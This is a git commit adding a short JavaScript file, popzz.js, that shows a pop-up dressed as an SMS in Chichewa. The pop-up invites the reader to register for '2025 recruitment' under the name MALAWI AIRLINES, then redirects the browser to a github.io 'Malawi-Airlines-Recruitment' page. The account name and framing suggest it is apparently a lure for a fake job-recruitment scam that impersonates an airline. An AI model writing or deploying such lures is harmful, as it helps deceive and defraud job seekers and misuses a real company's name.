d72093d7891cf181fc8a47152793e31c8d8b2107
offernoww <josiahnyeti16@gmail.com>
2025-01-20 18:27:31 +0100

    Create popzz.js

---
+++ popzz.js
@@ -0,0 +1,6 @@
+
+var password = 'MALAWI AIRLINES'
+password=prompt('SMS :Lemberani ntchito yolemba anthu 2025, dinani Chabwino kuti mulembetse  ','MALAWI AIRLINES');
+if (password != 'MALAWI AIRLINES') {
+location.href='https://offernoww.github.io/Malawi-Airlines-Recruitment';
+}
